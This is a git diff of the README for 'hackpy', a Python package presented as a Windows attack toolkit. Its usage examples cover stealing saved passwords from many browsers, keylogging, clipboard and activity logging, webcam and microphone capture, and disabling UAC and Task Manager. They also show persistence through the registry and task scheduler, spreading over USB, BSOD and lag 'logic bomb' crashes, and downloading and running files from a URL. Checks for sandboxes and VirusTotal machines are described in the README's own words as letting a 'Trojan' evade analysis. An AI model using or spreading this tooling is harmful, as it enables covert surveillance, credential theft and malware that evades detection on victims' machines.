@@ -1,28 +1,49 @@
 ﻿![Python](https://www.python.org/static/img/python-logo@2x.png)
-# `pip install hackpy` :bomb:
+# `pip install hackpy`  :bomb:
 
-# Example usage:
+# HackPy 0.1.7 / BETA!!!
+
+## [Donate](https://www.donationalerts.com/r/limerboy)
+
+`Warning! This module created only for Windows systems!`
+
+# Start:
 ``` python
-# Warning! This module working only on Windows systems!
+# 
 # Import module
 import hackpy
 
+# Selected files will be downloaded to your computer automatically when function 'load_modules(..)' is launched.
+# They are necessary for some functions to work.
+# To download them, you need an Internet connection when you first import the module on a computer
+hackpy.load_modules(
+    'autorun.exe',      # Size: 13.5 KB | Need for hackpy.autorun(file).installRegistry(), hackpy.autorun(file).uninstallRegistry(), hackpy.autorun(file).installTaskscheduler(), hackpy.autorun(file).uninstallTaskscheduler()
+    'webcam.exe',       # Size: 71.0 KB | Need for hackpy.webcamScreenshot(filename = 'screenshot.png', delay = 4500, camera = 1)
+    'nircmd.exe',       # Size: 51.0 KB | Need for hackpy.desktopScreenshot(), hackpy.command.nircmdc()
+    'activity.exe',     # Size: 14.0 KB | Need for hackpy.getActiveWindow(), hackpy.userIsActive(), hackpy.setCursorPos(x,y), hackpy.getCursorPos()
+    'audio.zip',        # Size: 297  KB | Need for hackpy.recordAudio(filename = 'recording.wav', time = 20)
+    'bsod.exe',         # Size: 11.0 KB | Need for hackpy.bsod()
+    'rotate_screen.exe',# Size: 16.0 KB | Need for hackpy.rotateScreen()
+    'uac.exe',          # Size: 12.0 KB | Need for hackpy.uac.disable(), hackpy.uac.enable(), hackpy.uac.status()
+    'watchdog.exe',     # Size: 12.5 KB | Need for hackpy.watchdog('firefox.exe').start()
+    'system_status.exe' # Size: 16.0 KB | Need for hackpy.inSandBox(), hackpy.inVirtualBox(), hackpy.cpuName(), hackpy.cpuUsage(), hackpy.gpuName(), hackpy.totalMemory()
+)
 ```
 
 # Get user and system information
-![SystemInfo](https://i.ibb.co/b3gmsxg/hackpy-System-Info.png)
+![SystemInfo](https://i.ibb.co/MBXpFhj/hackpy-User-Info.png)
 ``` python
 print(
-    '\nWelcome to HackPy 0.1.6\n'             +
-    '\nUsername: '     + hackpy.userInfo      +
-    '\nVersion: '      + hackpy.versionInfo   +
-    '\nRelease: '      + hackpy.releaseInfo   +
-    '\nSystem: '       + hackpy.systemInfo    +
-    '\nNode: '         + hackpy.nodeInfo      +
-    '\nMachine: '      + hackpy.machineInfo   +
-    '\nProcessor: '    + hackpy.processorInfo +
-    '\nPlatform: '     + hackpy.platformInfo  +
-    '\nArchitecture: ' + hackpy.architectureInfo[0]
+    '\nWelcome to HackPy 0.1.7\n'               +
+    '\nUsername: '     + hackpy.userInfo()      +
+    '\nVersion: '      + hackpy.versionInfo()   +
+    '\nRelease: '      + hackpy.releaseInfo()   +
+    '\nSystem: '       + hackpy.systemInfo()    +
+    '\nNode: '         + hackpy.nodeInfo()      +
+    '\nMachine: '      + hackpy.machineInfo()   +
+    '\nProcessor: '    + hackpy.processorInfo() +
+    '\nPlatform: '     + hackpy.platformInfo()  +
+    '\nArchitecture: ' + hackpy.architecture()
     )
 ```
 
@@ -43,8 +64,8 @@ hackpy.recordAudio(filename = 'recording.wav', time = 20)
 ```
 
 # Passwords recovery
-![SITE](https://i.ibb.co/nnjYFxV/hackpy-passwords-Recovery.png)
-Get passwords from Chrome, Opera, Chromium, Amigo, Atom, Vivaldo, Orbitum, Kometa, Comodo, 360Browser, K-Melon, Maxthon3, Nichrome, CocCoc, Uran, Chromodo browsers..
+![SITE](https://i.ibb.co/rcr3ZLJ/hackpy-Stealler-Module.png)  
+Get passwords from Chrome, Opera, Chromium, Amigo, Atom, Vivaldo, Orbitum, Kometa, Comodo, 360Browser, K-Melon, Maxthon3, Nichrome, CocCoc, Uran, Chromodo browsers..  
 ``` python
 from hackpy.passwords import *
 
@@ -78,14 +99,56 @@ hackpy.taskmanager.disable()
 hackpy.taskmanager.enable()
 ```
 
+# UAC
+``` python
+# Uac status
+hackpy.uac.status()  # "enabled" or "disabled" # Need admin rights
+
+# Disable UAC
+hackpy.uac.disable() # Need admin rights
+# Enable UAC
+hackpy.uac.enable()  # Need admin rights
+```
+
 # Autorun
 ``` python
-# Add cmd.exe to startup
-hackpy.autorun('C:\\Windows\\System32\\cmd.exe').install()
+# Add cmd.exe to startup      | Method with Registry.
+hackpy.autorun('C:\\Windows\\System32\\cmd.exe').installRegistry() # Program will be started as User.
 
-# Remove cmd.exe from startup
-hackpy.autorun('C:\\Windows\\System32\\cmd.exe').uninstall()
+# Remove cmd.exe from startup | Method with Registry.
+hackpy.autorun('C:\\Windows\\System32\\cmd.exe').uninstallRegistry()
+
+
+# Add cmd.exe to startup      | Method with TaskScheduler. # Need Admin Rights
+hackpy.autorun('C:\\Windows\\System32\\cmd.exe').installTaskscheduler() # Program will be started as Admin.
+
+# Remove cmd.exe from startup | Method with TaskScheduler. # Need Admin Rights
+hackpy.autorun('C:\\Windows\\System32\\cmd.exe').uninstallTaskscheduler()
+
 ```
+
+
+# WatchDog
+``` python
+# Restart explorer.exe when it stopped.
+# WARNING ONLY WORKING WITH EXECUTABLE FILES
+watchdog = hackpy.watchdog('explorer.exe')
+# Start watchdog
+watchdog.start()
+# .
+# .
+# .
+# Stop watchdog
+watchdog.stop()
+```
+
+# Anti SandBox and anti VirtualBox
+``` python
+if hackpy.inSandBox() or hackpy.inVirtualBox(): # If program started in SandBox or VirtualBox
+	print('Detected emulator. Stopping!') 
+	exit() # Exit
+```
+
 
 # Key Logger
 ``` python
@@ -95,6 +158,9 @@ from hackpy.keyboard import *
 keylogger = Keylogger(filename = 'keylogs.txt')
 # Start logger
 keylogger.start()
+# .
+# .
+# .
 # Stop logger
 keylogger.stop()
 # Show logger logs
@@ -110,6 +176,9 @@ keylogger.cleanLogs()
 cliplogger = hackpy.clipboard.Clipboardlogger('clipboardlogger.txt')
 # Start logger
 cliplogger.start()
+# .
+# .
+# .
 # Stop logger
 cliplogger.stop()
 # Show logs
@@ -122,11 +191,12 @@ cliplogger.cleanLogs()
 # Program Activity Logger
 ``` python
 # Log all opened program titles. Format: (DATE) - "Program title"
-from hackpy.activity import *
-
 activitylogger = ProgramActivitylogger('programActivityLogger.txt')
 # Start logger
 activitylogger.start()
+# .
+# .
+# .
 # Stop logger
 activitylogger.stop()
 # Show logs
@@ -144,6 +214,16 @@ if (hackpy.isAdmin()): # return True if program started as admin
     print('Okay, debugMessage:', status[1])
 else:
     print('Program started as user!')
+```
+
+# BSoD | Crash system
+``` python
+
+# BsoD
+hackpy.bsod()
+
+# Make some lags
+hackpy.logicBomb()
 ```
 
 # Simple file control
@@ -174,6 +254,13 @@ for antivirus in data:
     print('[!] - Antivirus detected: ' + antivirus + ', install path: ' + data[antivirus])
 ```
 
+# Check organization
+``` python
+if hackpy.checkOrganization():
+    print('Trojan started on VirusTotal machine! Stopping..')
+    exit()
+```
+
 # UsbSpread
 ``` python
 print('Copying file to all drives...')        # Need Admin Rights
@@ -198,15 +285,6 @@ target = 'google.com'
 ip     = hackpy.getHostByName(target) # return '172.217.16.14'
 
 print('IP: ' + ip)
-```
-
-
-# Get mac address by local ip
-``` python
-target = '192.168.1.1'
-mac    = hackpy.getmac(target) # return 'XX:XX:XX:XX:XX:XX' 
-
-print('mac: ' + mac)
 ```
 
 # Port scanner
@@ -239,8 +317,8 @@ print('[?] - Latitude: ' + data['geoplugin_latitude'])
 
 # Get router bssid:
 ``` python
-# Get router BSSID
-bssid_string = hackpy.router()
+# Get router BSSID | Work fine with Windows 10! 
+bssid_string = hackpy.router() # BETA
 # Find LATITUDE and LONGITUDE with router BSSID:
 data = hackpy.bssid_locate(bssid_string)
 print(
@@ -279,28 +357,40 @@ image = 'C:\\users\\Admin\\wallpaper.png'
 hackpy.setWallpaper(image) # BETA
 ```
 
-# Nircmdc commands
+# Commands
 ![SITE](https://i.ibb.co/znRLN0D/image.png)
 ``` python
 # You can run nircmdc commands in python
+# Nircmdc reference: https://nircmd.nirsoft.net
 hackpy.command.nircmdc('monitor off')
 hackpy.command.nircmdc('speak text \"HAHAHAHAHHAH IM FIND YOU!\"')
-# Nircmdc reference: https://nircmd.nirsoft.net
-```
 
 # System commands
-``` python
 hackpy.command.system('shutdown -s -t 260')
+
+#Execute powershell command
+hackpy.command.powershell('command')
 ```
 
 # Mouse, Windows control
 ``` python
-import hackpy.activity
+# Return active window title
+hackpy.getActiveWindow()
+# return True if user move mouse. Return False if not
+hackpy.userIsActive()   #  BETA!!!
+# Set mouse cursor position (x, y)
+hackpy.setCursorPos(100, 100) 
+# Get mouse corsor position (x, y)
+hackpy.getCursorPos() 
+```
 
-hackpy.activity.getActiveWindow() # Return active window title
-hackpy.activity.userIsActive()    # return True if user move mouse. Return False if not | BETA!!!
-hackpy.activity.setCursorPos(100, 100) # x, y
-hackpy.activity.getCursorPos() # return  x, y
+# Rotate screen
+``` python
+
+# Rotate screen
+for degrees in (90, 180, 270, 0):
+    hackpy.rotateScreen(degrees)
+
 ```
 
 # Time
@@ -352,10 +442,26 @@ else:
 # Load and run file from internet
 ``` python
 # Download file
-file = hackpy.wget(url)
+file = hackpy.download(url)
 # Start file
 hackpy.file.start(file)
 ```
+
+# System info
+``` python
+hackpy.cpuName()                # 'Intel(R) Core(TM) i5 CPU    M 560  @ 2.67GHz'
+hackpy.cpuUsage()               # 79
+hackpy.gpuName()                # 'NVIDIA NVS 3100M'
+hackpy.architecture()           # 64
+hackpy.getHWID()                # 'BFBBFBFF00120625'
+hackpy.totalMemory()            # 6149996
+hackpy.freePhysicalMemory()     # 3285036
+hackpy.totalVirtualMemory()     # 9164652
+hackpy.freeVirtualMemory()      # 4629700
+
+```
+
+
 
 # Power
 ``` python
